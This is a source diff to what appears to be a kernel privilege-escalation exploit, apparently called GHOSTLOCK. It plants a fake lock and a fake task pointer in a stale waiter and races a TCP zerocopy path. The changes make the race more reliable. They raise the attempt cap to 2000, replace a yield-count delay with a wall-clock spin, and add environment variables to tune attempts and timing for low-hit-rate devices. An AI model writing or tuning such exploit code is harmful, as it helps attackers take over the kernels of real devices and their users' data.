@@ -16,10 +16,12 @@ int route_last_errno;
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
-/* caps a route that never wins so a lost run does not spend the app timeout */
-#define TCP_ROUTE_ATTEMPTS 128
+/* caps a route that never wins so a lost run does not spend the app timeout.
+ * 2000 matches upstream's validated tcp_zerocopy attempts; the race is a
+ * lottery and the cap only bounds a losing run */
+#define TCP_ROUTE_ATTEMPTS 2000
 #define TCP_ARM_SEQ 16
-#define TCP_POST_GETSOCKOPT_HOLD 20000
+#define TCP_POST_GETSOCKOPT_HOLD_USEC 400
 /* compact pselect retry */
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 
@@ -95,6 +97,16 @@ static int tcp_make_pair(int *client_fd, int *server_fd) {
     return -1;
   }
   return 0;
+}
+
+/* Bounded busy-wait so the timing is wall clock, not a yield count whose cost
+ * swings with core speed and thermal state. */
+static void spin_usec(long usec) {
+  struct timespec ref;
+  clock_gettime(CLOCK_MONOTONIC, &ref);
+  while (fops_elapsed_ms(&ref) * 1000.0 < (double)usec) {
+    __asm__ volatile("yield" ::: "memory");
+  }
 }
 
 static void *tcp_punch_thread(void *arg) {
@@ -190,13 +202,20 @@ void do_tcp_fake_lock_route(void) {
 
   /* waiter->task carries init_task's phys alias, not the image address */
   uintptr_t waiter_task = SLIDE_INIT_TASK;
-  int arm_seq = TCP_ARM_SEQ;
-  int post_hold = TCP_POST_GETSOCKOPT_HOLD;
+  /* attempts is the race-ticket count: raise it for a low-hit-rate device,
+   * it only costs time on a run that is losing anyway */
+  int attempts = env_int("GHOSTLOCK_TCP_ATTEMPTS", TCP_ROUTE_ATTEMPTS,
+                         1, 100000);
+  /* settle the puncher before arming; sweep with GHOSTLOCK_TCP_ARM_SEQ.
+   * post_hold is a wall-clock hold so it does not depend on core speed */
+  int arm_seq = env_int("GHOSTLOCK_TCP_ARM_SEQ", TCP_ARM_SEQ, 0, attempts);
+  int post_hold = env_int("GHOSTLOCK_TCP_POST_HOLD_USEC",
+                          TCP_POST_GETSOCKOPT_HOLD_USEC, 0, 100000);
 
   pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
           "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
           page_base, fake_lock, fake_w0, fake_task, waiter_task,
-          TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
+          attempts, arm_seq, post_hold);
 
   atomic_store(&tcp_punch_go, 1);
   /* custom-write mode: fire the PI walk immediately */
@@ -205,7 +224,7 @@ void do_tcp_fake_lock_route(void) {
   char sendbuf[64];
   memset(sendbuf, 0x33, sizeof(sendbuf));
 
-  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS && !route_ok; i++) {
+  for (int i = 1; i <= attempts && !route_ok; i++) {
     int calls_before = atomic_load(&consumer_calls);
     int success_before = atomic_load(&consumer_success);
     (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
@@ -241,9 +260,7 @@ void do_tcp_fake_lock_route(void) {
      * waiter frame; earlier release walks a half-written waiter */
     if (i >= arm_seq && ret == 0) {
       atomic_store(&punch_consume_go, i);
-      for (int spin = 0; spin < post_hold; spin++) {
-        __asm__ volatile("yield" ::: "memory");
-      }
+      spin_usec(post_hold);
       tcp_wait_for_consumer_idle();
     }
 
